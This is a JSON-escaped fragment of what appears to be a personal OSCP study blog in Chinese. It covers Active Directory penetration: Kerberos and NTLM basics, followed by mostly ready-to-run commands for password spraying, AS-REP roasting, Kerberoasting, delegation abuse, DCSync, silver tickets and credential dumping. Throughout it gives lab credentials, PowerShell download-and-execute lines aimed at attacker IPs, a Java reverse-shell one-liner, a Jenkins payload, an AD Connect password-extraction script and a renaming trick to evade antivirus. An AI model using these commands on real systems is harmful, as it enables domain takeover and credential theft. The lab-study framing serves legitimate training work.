id=\"4密码获取\"\u003e4、密码获取\u003c/h2\u003e\n\u003cp\u003e当前主机的软件密码，使用LaZagne即可，可能存在不匹配，建议多尝试。\u003c/p\u003e\n\u003ch2 id=\"5kerberoasting\"\u003e5、kerberoasting\u003c/h2\u003e\n\u003cp\u003e我认为在进行信息收集后就可以尝试，因为该攻击的操作算作比较简单\u003c/p\u003e\n\u003ch2 id=\"6adcs证书攻击\"\u003e6、ADCS证书攻击\u003c/h2\u003e\n\u003cp\u003e在目标主机开放80和https的情况下，很有可能存在证书攻击，CVE-2022-26923、CVE-2021-42287、错误的ADCS模板\u003c/p\u003e\n\u003ch2 id=\"7白银票据\"\u003e7、白银票据\u003c/h2\u003e\n\u003cp\u003e如果在一些特殊情况下，可以获得服务账户密码的情况下可以尝试登录服务，如sqlserver，使用pip 安装的mssqlclient甚至可以执行命令\u003c/p\u003e\n\u003ch2 id=\"8域内漏洞\"\u003e8、域内漏洞\u003c/h2\u003e\n\u003cp\u003e我认为该方式一般为没有方法的情况下进行尝试，因为这种方式没有明显特征：\u003c/p\u003e\n\u003cp\u003e① MS14-068\u003c/p\u003e\n\u003cp\u003e② Netlogon\u003c/p\u003e","title":"域渗透思路总结"},{"content":"impacket-lookupsid 可获取主机用户名：\nimpacket-lookupsid svc_apache:\u0026#39;S@Ss!K@*t13\u0026#39;@\u0026#39;flight.htb\u0026#39; 筛选用户： cat u|grep SidTypeUser|awk -F \u0026#39;\\\u0026#39; \u0026#39;{ print $2 }\u0026#39;|awk -F \u0026#39; \u0026#39; \u0026#39;{ print $1 }\u0026#39; 组合拳：winpeass+mimikatz+信息检索+linuxpeass+枚举服务+暴力破解 同步ntp时间：\nsudo ntpdate -s 10.10.10.24 查看是否在域内：\nnet time /do 一、NTLM协议 1、LM hash算法 简要：采用DES加密，容易被破解，明文长度最长为14，windows vista和windows server 2008后，默认禁用。\n2、NTLM hash算法 简要：为了解决LM hash的问题而引入，使用MD4散列算法，存放在SAM文件中\n3、NTLM 协议认证 简要：基于挑战响应的验证机制，分为Negotiate 协商、challenge 质询、Authentication 认证三步，存在两个版本 V1和V2，目前使用较多的为V2，区别为challenge值和算法不同。\nchallenge值： V1：8B V2：16B Net-Ntlm hash: V1：DES加密算法 V2：HMAC-MD5加密算法\n4、攻击方式 基于以上特性，NTLM主要有三种攻击方式： 1、PTH，由于整个认证过程中都是使用NTLM hash来进行认证，只需要拿到NTLM hash即可通过135/445进行横向移动。 2、NET-NTLM Relay，发生在response中。 3、Net-NTLM v1 hash 破解，由于设计缺陷，获得hash即可破解，可使用打印机漏洞等方式获取。\n二、Kerberos协议 1、基础 ①客户端 ②服务端，拥有唯一的SPN（服务主体名称） ③认证服务的KDC（密钥分发中心），服务账户为krbtgt。\n简要：使用TCP/UDP 88进行认证，TCP/UDP 464进行密码重置，两个基础认证模块：AS_REQ\u0026amp;AS_REP和TGS_REQ\u0026amp;TGS_REP，以及两个扩展模块:S4U（分为S4u2Self和S4u2Proxy）和PAC。\n2、PAC 简要：微软引入进行权限鉴别的东西，正常的Kerberos流程中，TGT和ST均带有PAC。这部分内容可以伪造，但是具有签名，使用服务端或者KDC密钥进行签名，如果有服务端密钥就可以伪造，但是如果开启了KDC校验，就无法伪造。（白银票据的防御）\n3、认证流程 4、攻击方式 密码喷洒： 在AS_REQ请求包中的cname字段，用户名存在与否，密码正确与否，KDC返回内容不一样导致。\nAS-REP Roasting 如果没有进行预认证，在AS_REP中返回的内容由用户hash加密，如果能破解成功，那么就可以获取到用户明文密码。\nKerberoasting 在TGS-REP阶段中，返回的内容由服务的hash加密，如果能破解成功，那么就可以获取到用户明文密码，理论上可以获取到krbtgt用户的密码，但是这个服务账户的密码是随机的，爆破不出来。\n三、LDAP协议 简要：树状图，用来标记活动目录中的对象\n四、组策略 简要：一种域内管理手段，简单理解为脚本。GPT是具体的配置模板，通常位于域控的%systemroot%\\sysvol\\域名、Policies文件夹内，任何用户均可访问，\n攻击方式： 1、组策略首选项，如有批量密码修改的情况，密码采用AES-256加密，但是微软公布了密钥，导致可以解密里面存放的密码。 2、滥用的委派情况，如果委派了某个用户对组策略的修改，可用来造成权限维持。 3、定时任务\n五、ACL 访问控制列表 SP：安全主体，可以通过系统进行身份鉴别的任何实体，例如：用户账户、计算机账户、进程、线程等。 SID：安全标识符，标识安全主体的东西，控制身份鉴别，相关权限的东西。 访问控制模型： 1、访问令牌，包含各种SID，用户的、组的、所有者的等等； 2、安全描述符，创建的安全对象会分配相关的安全信息，包括各种控制信息。\n渗透手法 1、域内用户枚举 适用场景：\n可在域外进行，无域内用户的场景下进行；\n利用工具：\nkerbrute pyKerbrute msf\n../kerbrute_linux_386 userenum --dc 10.10.11.129 -d search.htb user.txt -v 2、密码喷洒 适用场景：\n可在域外进行，但是要注意密码策略，如果有域内用户，可通过Adinfo_darwin查询域内账户策略，防止被封。\n(如果有账户，可以查询域内的其他用户进行喷洒，如果没有，就要配合枚举进行强行喷洒)\n利用工具：\nkerbrute\n../kerbrute_linux_amd64 passwordspray --dc 10.10.10.248 -d intelligence.htb /usr/share/wordlists/john.lst \u0026#39;NewIntelligenceCorpUser9876\u0026#39; pyKerbrute DomainPassword Spray.ps1\nhttps://github.com/dafthack/DomainPasswordSpray powershell -exec bypass Import-Module .\\DomainPasswordSpray.ps1 Invoke-DomainPasswordSpray -Password 密码 .\\Rubeus.exe brute /passwords:\u0026lt;passwords_file\u0026gt; /outfile:\u0026lt;output_file\u0026gt;\n小技巧：\n通过crackmapexec来获取密码策略，2016下\ncrackmapexec smb ip --pass-pol -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; 或者域内主机： net accounts 3、AS-REP Roasting 适用场景：\n目标用户账户设置不进行预身份验证，但是该选项默认不开启，也就是说这个攻击默认配置是无法进行的。同时需要在域内主机或者拥有域内用户账户的情况下进行。\n(有用户名，可以在域外直接打)\n利用工具：\nRubeus （自动搜索可攻击的账户，并保存为john可爆破的格式，在域内主机上执行） ASREPRoast.ps1 (域内主机执行，自动搜索可攻击的账户，需要使用select进行筛选，john可爆破格式) Adfind+impacket GetNPUsers.py(可在域外执行，但是得有可用用户密码，使用Adfind筛选账户，使用GetNPUsers.py获取hash)\n一、域外打法： 获取账户： ① 匿名LDAP登录使用： ldapsearch -x -H ldap://10.10.10.161:389 -u \u0026#39;\u0026#39; -w \u0026#39;\u0026#39; -b \u0026#34;DC=htb,DC=local\u0026#34; \u0026#34;(\u0026amp;(objectCategory=person)(objectClass=user))\u0026#34; |grep dn 筛选AWK语句： ②有身份信息使用adfinder:(方便很多) 或者cme 获取john hash python ../impacket/examples/GetNPUsers.py -dc-ip 10.10.10.161 -usersfile username.txt -format john htb.local/ 有身份信息： GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete 破解 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force 二、域内打法： https://github.com/r3motecontrol/Ghostpack-CompiledBinaries .\\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast Rubeus 梭哈，自动化 https://github.com/HarmJ0y/ASREPRoast ASREPRoast.ps1 梭哈，自动化 Import-Module .\\ASREPRoast.ps1 Invoke-ASREPRoast 4、kerberoasting 适用场景：（有一个普通权限就可以尝试）\n1、拥有一个合法用户密码；2、域内有注册于域用户下的SPN\n利用方法：\n1、获取滥用的SPN：\nRiskySPN：域内主机，该工具可自动过滤出可用的SPN GetUSerSPNS：域内主机，该工具会列出所有注册于用户名下的SPN powerview.ps1：域内主机，该工具会列出所有注册于用户名下的SPN\n2、请求服务票据：\nimpacket GetuserSPNs.py：域外主机，使用账号密码，该工具可以跳过第一步，输出内容为hashcat可爆破内容。\nRubeus：域内主机，该工具可以跳过第一步，输出内容为hashcat或者john可爆破内容. mimikatz：域内主机，挨个请求，保存在内存中\n3、使用上述工具输出的内容破解，或者使用mimikatz、empire导出票据破解\n4、破解工具 kerberoast：可用于破解mimikatz导出的.kirbi格式的票据爆破 tgscrack：.kirbi格式转换后破解 hashcat：破解\n操作\n域外主机，有账密打域内： 获取滥用的SPN： python GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 获取ST，保存为hashcat能爆破的格式： python /home/kali/Desktop/HTB/impacket/examples/GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -outputfile hash.txt 爆破： hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force 域内主机： 1、 .\\Rubeus.exe kerberoast /format:hashcat /outfile:hashes.asreproast 2、 https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1 iex(new-object net.webclient).downloadString(\u0026#39;http://192.168.49.211:80/Invoke-Kerberoast.ps1\u0026#39;); Invoke-Kerberoast -OutputFormat Hashcat hashcat -m 13100 --force -a 0 svc_mssql.kerberoast /usr/share/wordlists/rockyou.txt 5、委派 非约束性委派打法： **场景：拿到具有委派的服务账户（bloodhound可查）\n相关主机账户和服务账户：userAccountControl 会包含 TRUSTED_FOR_DELEGATION 字段，域控默认非约束性委派。\n使用mimikatz抓取即可，TGT，访问目标什么权限，就可以获得什么权限。\n非约束委派在实战遇到较少，一般都是打印机强制认证，利用也不稳定。\n需要非约束委派主机控制权\n约束委派打法： **场景：拿到具有委派的服务账户（bloodhound可查）\n主机账号或者服务账号被设置为约束委派时， userAccountControl 会包含RUSTED_TO_AUTHENTICATE_FOR_DELEGATION 字段，有msDS-AllowedToDelegateTo字段，里面包含了允许委派的服务\n利用条件为： 1、知道设置约束性委派的用户名和密码（或者Hash） （通常为当前立足点） 2、知道设置约束性委派设置的委派目标的SPN （通常为横向目标主机）\n就可以获取到委派目标的权限，通常为管理员。\n利用方式：\nhash方式： python ../impacket/examples/getST.py -dc-ip 10.10.10.248 （域名/机器账户，不用加$）intelligence.htb/svc_int -hashes :e0dcda8d93bf71a6352ea7803c8f17f1 -spn (可以为委派的spn)www/DC.intelligence.htb -impersonate \u0026#39;administrator\u0026#39; 账密： python ../impacket/examples/getST.py -dc-ip 10.10.10.248 （域名/机器账户，不用加$）intelligence.htb/svc_int：password -spn (可以为委派的spn)www/DC.intelligence.htb -impersonate \u0026#39;administrator\u0026#39; 基于资源的约束委派打法 **场景：拿到具有委派的服务账户（bloodhound可查，不一定明说，DC的完全控制权可以，可看hacktricks）\n当拿到的主机具备以下权限时可以考虑：\n默认情况下以下账户拥有修改 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的权限：\nDomain Admins(域管理员)\nmS-DS-CreatorSID(将该机器加入域的账户)\nNT AUTHORITY\\SELF(机器账户本身）\n在假设获取到了域内普通用户的情况下：\n攻击步骤：\n1、查看当前用户对应的域内机器； 2、创建机器用户； 3、由于当前用户对加入域内的主机拥有配置基于RBCD的权限，所以配置RBCD； 4、使用新建的机器账 户，就可以获取到目标域内机器的最高权限。\n域内主机，域外参考sxf域渗透打法：\n一、导入模块： Import-Module ./Powermad.ps1 或者 . ./Powermad.ps1 二、添加机器账户，基于资源的约束型委派需要： Set-Variable -Name \u0026#34;FakePC\u0026#34; -Value \u0026#34;FAKE01\u0026#34; # FAKE01这个名字可以自己改 Set-Variable -Name \u0026#34;targetComputer\u0026#34; -Value \u0026#34;DC\u0026#34; New-MachineAccount -MachineAccount (Get-Variable -Name \u0026#34;FakePC\u0026#34;).Value -Password $(ConvertTo-SecureString \u0026#39;123456\u0026#39; -AsPlainText -Force) -Verbose 三、设置权限 Set-ADComputer (Get-Variable -Name \u0026#34;targetComputer\u0026#34;).Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name \u0026#34;FakePC\u0026#34;).Value + \u0026#39;$\u0026#39;) 四、生成hash ./Rubeus.exe hash /password:123456 /user:FAKE01$ /domain:support.htb 五、利用hash申请票据 添加hosts文件 echo \u0026#34;10.10.11.174 support.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts echo \u0026#34;10.10.11.174 dc.support.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts 生成TGT票据，以administrator的身份申请一张访问http/dc.support.htb服务的票据 python3 getST.py support.htb/FAKE01 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B 六、连接 添加票据，如果失败，添加dns解析 export KRB5CCNAME=administrator.ccache smbexec.py support.htb/administrator@dc.support.htb -no-pass -k 方法二： impacket-addcomputer -computer-name \u0026#34;machine19\u0026#34; -computer-pass \u0026#34;P@ssw0rd\u0026#34; -dc-ip 192.168.180.175 -method SAMR -debug resourced.local/L.Livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 impacket-rbcd -delegate-from machine19$ -delegate-to RESOURCEDC$ -dc-ip 192.168.180.175 -action write resourced.local/L.Livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 impacket-getST resourced.local/\u0026#39;machine18$\u0026#39;:\u0026#39;P@ssw0rd\u0026#39; -spn cifs/RESOURCEDC.resourced.local -impersonate administrator 后面第六步一样 总结条件： 1、攻击者拥有(将该机器加入域的账户、机器本身、管理员）身份之一，多数为前两者。 2、存在相关主机（也就是横向 or 提权目标）\n应用场景为：提权、有其他主机被当前用户拉入域内的横向移动。\nkerberos Bronze Bit（打委派的时候记得尝试） 这个漏洞可以绕过不允许委派的敏感账户进行委派，getst.py后加上-force-forwardable参数即可\n6、DCSYNC 利用域控的复制，获取所有账号密码\n7、PTH PTH存在限制，默认情况下，由于UAC的存在，只有本地管理员和域管理员组用户可以直接PTH。\n8、域内漏洞 1、MS14-068\n梭哈，域内普通用户主机直接打域控\n方案一：impacket apt-get install krb5-user -y python ../impacket/examples/goldenPac.py -dc-ip 10.10.10.52 -target-ip 10.10.10.52 htb.local/james:\u0026#39;J@m3s_P@ssW0rd!\u0026#39;@MANTIS.htb.local 报错解决方案 https://note.f5.pm/go-37050.html 方案二： Metasploit 方案三： PyKEK 工具包 当前kali环境没成功过 2、zerologon\n梭哈，域外直接打域控，走135端口\n3、windows print spooler\n域内普通用户，上线CS\n4、ADCS 证书攻击\n2021年进入人们视野，在域中可以使用证书进行身份认证，身份鉴别在于私钥，拥有私钥甚至可以用作权限维持，总是可以获取到最新的NTLM hash。\n但是不是所有的证书都可以用来进行身份认证，只有部分配置了特殊权限的证书可以。\nCertify.git https://github.com/ademkanat/Certify.git\nCVE-2022-26923 该漏洞便是因为机器账户，可以申请域控的证书，导致的普通用户提权到域管。\ncertipy攻击\nCVE-2021-42287 该漏洞和上述漏洞较为相似，但是攻击链更为复杂，同样是需要一个有效用户。\n可梭哈\n错误的ADCS模板配置：\nExchange 两条攻击链，均可梭哈\n9、中继 这种方式其实叫做认证：\nsudo responder -i 10.10.16.3 -I tun0 抓到的hash需要破解，装进txt，使用john --wordlist=xxx hash.txt 或者：hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force 中继： ntlmrelayx\nimpacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c \u0026#34;powershell -enc JABjAGwAaQBlAG4AdA...\u0026#34; dir \\192.168.45.168\\test\n10、白银票据 特殊情况下获得服务的密码以及sid和spn，可以尝试：\nntlm hash生成网站： https://www.browserling.com/tools/ntlm-hash 需要：sid\\spn: python ../impacket/examples/ticketer.py -domain-sid S-1-5-21-2743207045-1827831105-2542523200-502 -spn MSSQLSvc/dc1.scrm.local -nthash B999A16500B87D17EC7F2E2A68778F05 -domain scrm.local administrator mimikatz: kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin 几个横向工具 1、psexec 通过创建服务和上传二进制程序getshell，日志记录明显，且容易被杀。\n条件：445端口，IPC$开启，非IPC$开启（这几个条件默认满足）\n2、smbexec 通过创建服务和bat的形式执行命令，通过读取txt来获取回显，日志更为明显，defender拦截。\n条件：445端口，IPC$开启，非IPC$开启（这几个条件默认满足）\n3、wmiexec 通过wmi来实现命令执行，躲避杀软效果较好，445获取回显\n条件：135、445端口，admin$开启（默认满足）\n4、atexec 通过计划任务实现At exec的主要特点是通过135端口进行计划任务的创建，同时通过445端口进行SMB认证\n条件：135、445（默认满足）\n5、dcomexec 通过dcom在目标执行命令\n条件：135、445\nBloodhound Import-Module ./SharpHound.ps1 Invoke-BloodHound -c all 如果遇到无法上传，尝试使用1.1版本，甚至更低的1.0.3 https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.1/SharpHound-v1.1.1.zip bloodhound.py https://github.com/dirkjanm/BloodHound.py python3 bloodhound.py -d 域名 -u 用户 -p 密码 -ns 域控IP -dc 域控主机名 -c all --zip bloodhound.py-kerberos git clone https://github.com/jazzpizazz/BloodHound.py-Kerberos sudo ntpdate -s 10.10.11.181 python3 ../impacket/examples/getTGT.py absolute.htb/m.lovegod:\u0026#39;AbsoluteLDAP2022!\u0026#39; -dc-ip 10.10.11.181 export KRB5CCNAME=./m.lovegod.ccache python3 BloodHound.py-Kerberos/bloodhound.py -u m.lovegod -k -d absolute.htb -dc dc.absolute.htb -ns 10.10.11.181 --dns-tcp --zip -c All -no-pass Impacket工具包： dacl的连接： https://github.com/ShutdownRepo/impacket/tree/dacledit 域外添加账户权限，kerberos情况下： 同步时间： sudo ntpdate -s 10.10.11.181 申请票据： python3 impacket-dacledit/examples/getTGT.py absolute.htb/m.lovegod:\u0026#39;AbsoluteLDAP2022!\u0026#39; -dc-ip 10.10.11.181 添加环境变量： export KRB5CCNAME=m.lovegod.ccache 使用： python3 impacket-dacledit/examples/dacledit.py -action \u0026#39;write\u0026#39; -rights \u0026#39;WriteMembers\u0026#39; -principal \u0026#39;m.lovegod\u0026#39; -target-dn \u0026#39;CN=NETWORK AUDIT,CN=USERS,DC=ABSOLUTE,DC=HTB\u0026#39; -k -no-pass -u absolute.htb/m.lovegod -dc-ip 10.10.11.181 Impacket v0.12.0.dev1+20240116.639.82267d84 - Copyright 2021 SecureAuth Corporation 域外添加DCSYNC权限： python dacledit.py -action \u0026#39;write\u0026#39; -rights \u0026#39;FullControl\u0026#39; -principal \u0026#39;cxk\u0026#39; -target-dn \u0026#39;DC=HTB,DC=LOCAL\u0026#39; \u0026#39;HTB.LOCAL\u0026#39;/\u0026#39;cxk\u0026#39;:\u0026#39;cxk123!\u0026#39; -dc-ip 10.10.10.161 DCSYNC获取hash: python secretsdump.py HTB.LOCAL/cxk:\u0026#39;cxk123!\u0026#39;@10.10.10.161 mimikatz 非交互式运行： mimikatz.exe dpapi::firefox mimikatz.exe lsadump::dcsync /domain:scrm.local /all /csv 主机密码获取 浏览器等： https://github.com/AlessandroZ/LaZagne ReadLAPSPassword https://github.com/p0dalirius/pyLAPS 查询密码： python pyLAPS.py --action get -u \u0026#39;JDgodd\u0026#39; -d \u0026#39;streamio.htb\u0026#39; -p \u0026#39;JDg0dd1s@d0p3cr3@t0r\u0026#39; --dc-ip 10.10.11.158 writeowner 权限： 修改用户所有者： python owneredit.py -action write -new-owner \u0026#39;JDgodd\u0026#39; -target \u0026#39;CORE STAFF\u0026#39; \u0026#39;STREAMIO.HTB\u0026#39;/\u0026#39;JDgodd\u0026#39;:\u0026#39;JDg0dd1s@d0p3cr3@t0r\u0026#39; 修改DACL权限： 具体情况具体分析，主要是看这个组有什么权限,最好是完全控制权限：FullControl 授予JDgodd向CORE STAFF组添加用户的权限： dacledit.py -action \u0026#39;write\u0026#39; -rights \u0026#39;WriteMembers\u0026#39; -principal \u0026#39;JDgodd\u0026#39; -target-dn \u0026#39;CN=CORE STAFF,CN=USERS,DC=STREAMIO,DC=HTB\u0026#39; \u0026#39;STREAMIO.HTB\u0026#39;/\u0026#39;JDgodd\u0026#39;:\u0026#39;JDg0dd1s@d0p3cr3@t0r\u0026#39; 把自己添加到CORE STAFF组内： net rpc group addmem \u0026#34;CORE STAFF\u0026#34; \u0026#34;JDgodd\u0026#34; -U \u0026#34;STREAMIO.HTB\u0026#34;/\u0026#34;JDgodd\u0026#34;%\u0026#34;JDg0dd1s@d0p3cr3@t0r\u0026#34; -S \u0026#34;dc.STREAMIO.HTB\u0026#34; AD Recycle Bin组 查看已经删除了的用户： Get-ADObject -filter \u0026#39;isDeleted -eq $true -and name -ne \u0026#34;Deleted Objects\u0026#34;\u0026#39; -includeDeletedObjects 获取该用户的详细信息： Get-ADObject -filter { SAMAccountName -eq \u0026#34;TempAdmin\u0026#34; } -includeDeletedObjects -property * 添加dns记录 https://github.com/4ndr34z/krbrelayx.git 添加主机dns记录： python dnstool.py -u \u0026#39;intelligence\\Tiffany.Molina\u0026#39; -p NewIntelligenceCorpUser9876 10.10.10.248 -a add -r web1 -d 10.10.16.18 -t A ReadGMSAPassword权限 python gMSADumper.py -u \u0026#39;Ted.Graves\u0026#39; -p \u0026#39;Mr.Teddy\u0026#39; -d \u0026#39;intelligence.htb\u0026#39; ReadLAPSPassword https://github.com/p0dalirius/pyLAPS python pyLAPS.py --action get -d \u0026#34;hutch.offsec\u0026#34; -u \u0026#34;fmcSorley\u0026#34; -p \u0026#34;CrabSharkJellyfish192\u0026#34; --dc-ip 192.168.224.122 默认获取为administrator密码 Azure AD (AAD) Sync service攻击 查询注册表，服务路径： Get-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ADSync 通过路径确定版本： Get-ItemProperty -Path \u0026#34;C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\miiserver.exe\u0026#34;|Format-list -Property * -Force 从数据库中提取信息： sqlcmd -S MONTEVERDE -Q \u0026#34;use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration\u0026#34; poc: Function Get-ADConnectPassword{ Write-Host \u0026#34;AD Connect Sync Credential Extract POC (@_xpn_)`n\u0026#34; $key_id = 1 $instance_id = [GUID]\u0026#34;1852B527-DD4F-4ECF-B541-EFCCBFF29E31\u0026#34;(修改) $entropy = [GUID]\u0026#34;194EC2FC-F186-46CF-B44D-071EB61F49CD\u0026#34;（修改） $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList \u0026#34;Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true\u0026#34; $client.Open() $cmd = $client.CreateCommand() $cmd.CommandText = \u0026#34;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = \u0026#39;AD\u0026#39;\u0026#34; $reader = $cmd.ExecuteReader() $reader.Read() | Out-Null $config = $reader.GetString(0) $crypted = $reader.GetString(1) $reader.Close() add-type -path \u0026#39;C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll\u0026#39; $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager $km.LoadKeySet($entropy, $instance_id, $key_id) $key = $null $km.GetActiveCredentialKey([ref]$key) $key2 = $null $km.GetKey(1, [ref]$key2) $decrypted = $null $key2.DecryptBase64ToString($crypted, [ref]$decrypted) $domain = select-xml -Content $config -XPath \u0026#34;//parameter[@name=\u0026#39;forest-login-domain\u0026#39;]\u0026#34; | select @{Name = \u0026#39;Domain\u0026#39;; Expression = {$_.node.InnerXML}} $username = select-xml -Content $config -XPath \u0026#34;//parameter[@name=\u0026#39;forest-login-user\u0026#39;]\u0026#34; | select @{Name = \u0026#39;Username\u0026#39;; Expression = {$_.node.InnerXML}} $password = select-xml -Content $decrypted -XPath \u0026#34;//attribute\u0026#34; | select @{Name =\u0026#39;Password\u0026#39;; Expression = {$_.node.InnerXML}} Write-Host (\u0026#34;Domain: \u0026#34; + $domain.Domain) Write-Host (\u0026#34;Username: \u0026#34; + $username.Username) Write-Host (\u0026#34;Password: \u0026#34; + $password.Password) } powerview脚本 下载： https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1 bypass powershell -ep bypass 导入： . .\\PowerView.ps1 修改账户密码： $UserPassword = ConvertTo-SecureString \u0026#39;Password123!\u0026#39; -AsPlainText -Force Set-DomainUserPassword -Identity SMITH（用户名）-AccountPassword $UserPassword -Credential $Cred 常规用法： 查看域内信息： Get-NetDomain 查看用户信息： Get-NetUser Get-NetUser | select cn 查看组： Get-NetGroup | select cn 查看组成员 Get-NetGroup \u0026#34;Sales Department\u0026#34; | select member 查看主机信息： Get-NetComputer ！！！！！！！！！！！ 查看当前用户可以以管理员登录哪台计算机： Find-LocalAdminAccess 查看目标计算机登录的用户： Get-NetSession -ComputerName files04 -Verbose 枚举域共享： Find-DomainShare 票据常规操作 摧毁票据： kdestroy 导入票据： export KRB5CCNAME=administrator.ccache net rpc kerberos协议添加用户进组： net rpc group addmem \u0026#34;NETWORK AUDIT\u0026#34; \u0026#34;m.lovegod\u0026#34; -U \u0026#34;absolute.htb\u0026#34;/\u0026#34;m.lovegod\u0026#34; -S \u0026#34;DC.absolute.htb\u0026#34; --use-kerberos=required 修改密码，以hash的方式 net rpc password \u0026#34;Tristan.Davies\u0026#34; \u0026#34;newP@ssword2023\u0026#34; -U \u0026#34;search.htb\u0026#34;/\u0026#34;BIR-ADFS-GMSA$\u0026#34; -S \u0026#34;RESEARCH.search.htb\u0026#34; --pw-nt-hash Nishang 一个涵盖几乎所有渗透测试流程的脚本：\nhttps://github.com/samratashok/nishang/tree/master 一个简单介绍： 有点骚东西： https://www.bilibili.com/read/cv19365761/\n反弹shell：\n下载https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1 在最后面，添加： Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.2 -Port 4444 开启http服务： 远程调用执行： 1、powershell.exe -c \u0026#34;IEX(New-Object System.Net.WebClient).DownloadString(\u0026#39;http://192.168.45.223:8000/nishang.ps1\u0026#39;)\u0026#34; 2、powershell iex(new-object net.webclient).downloadstring(\\\u0026#34;http://10.10.16.5/Invoke-PowerShellTcp.ps1\\\u0026#34;) 3、IEX (New-Object System.Net.Webclient).DownloadString(\u0026#34;http://192.168.119.3/powercat.ps1\u0026#34;);powercat -c 192.168.119.3 -p 4444 -e powershell 躲避检测： 修改文件名字为tcp.ps1 sed -i \u0026#34;s/PowerShellTcp/tcpps/g\u0026#34; tcp.ps1 Jenkins: windows: def proc = \u0026#34;powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString(\u0026#39;http://10.10.16.3/nishang.ps1\u0026#39;)\u0026#34;.execute(); def os = new StringBuffer(); proc.waitForProcessOutput(os, System.err); println(os.toString()); Linux： String host=\u0026#34;83.229.122.49\u0026#34;; int port=8888; String cmd=\u0026#34;/bin/sh\u0026#34;; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()\u0026gt;0)so.write(pi.read());while(pe.available()\u0026gt;0)so.write(pe.read());while(si.available()\u0026gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); 正向shell：\n和上一步的却别在于，修改最后一行为： Invoke-PowerShellTcp -Bind -Port 1521 然后正向去连接： nc -nv 10.10.10.125 1521 PowerShell Empire 该工具作为msf禁用情况下的代替工具，核心还是代替EXE，存疑，建议别用\n开启服务： sudo powershell-empire server 启动客户端： sudo powershell-empire client 进入监听： listeners uselistener http 使用options查看设置详情： 设置监听详情： set Name yesir set Host 10.10.16.5 set Port 1336 execute 输入help查看帮助： 生成木马： usestager windows_reverseshell set Listener yesir set LocalHost 10.10.16.5 set LocalPort 1336 execute 查看会话： agents 进入会话： interact 会话名 退出会话： back targetedKerberoast https://github.com/ShutdownRepo/targetedKerberoast CrackMapExec 该工具的使用极为强大： 简介： https://mp.weixin.qq.com/s/G1PC_C3fhE-OGIbnBFRNQQ\ngithub: https://github.com/byt3bl33d3r/CrackMapExec\nsmb 192.168.216.144 -u \u0026#39;administrator\u0026#39; -p \u0026#39;pass1234!\u0026#39; -x \u0026#39;whoami\u0026#39; 持续爆破\n--continue-on-success 目前我感兴趣的地方：\n1、smb 枚举东西较多，如共享、杀软、域用户、密码策略、验证登录 2、dump hash，有高权限账号的话 3、导出ntds域内数据库 4、通过smb文件上传、下载 5、枚举打印机、webdav服务等 6、AS-REP Roast，在有用户名的前提下还可以再次枚举 7、ESC8 查找 8、ms17-010、zerologo（CVE-2020-1472）、petitpotam、nopac（CVE-2021-42278 and CVE-2021-42287）漏洞 域内权限的利用特点记录： owns权限记得先修改所属人，在进行下一步 影子凭证 Certipy工具 github.com/ly4k/Certipy 使用方式： https://cloud.tencent.com/developer/article/1946138 PsLoggedon 工具 查看主机登录账户： .\\PsLoggedon.exe \\\\web04 ","permalink":"https://yangzhuzai.github.io/posts/oscp/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%93%8D%E4%BD%9C/","summary":"\u003ch1 id=\"impacket-lookupsid\"\u003eimpacket-lookupsid\u003c/h1\u003e\n\u003cp\u003e可获取主机用户名：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eimpacket-lookupsid svc_apache:\u0026#39;S@Ss!K@*t13\u0026#39;@\u0026#39;flight.htb\u0026#39;\n\n筛选用户：\ncat u|grep SidTypeUser|awk -F \u0026#39;\\\u0026#39; \u0026#39;{ print $2 }\u0026#39;|awk -F \u0026#39; \u0026#39; \u0026#39;{ print $1 }\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003ch1 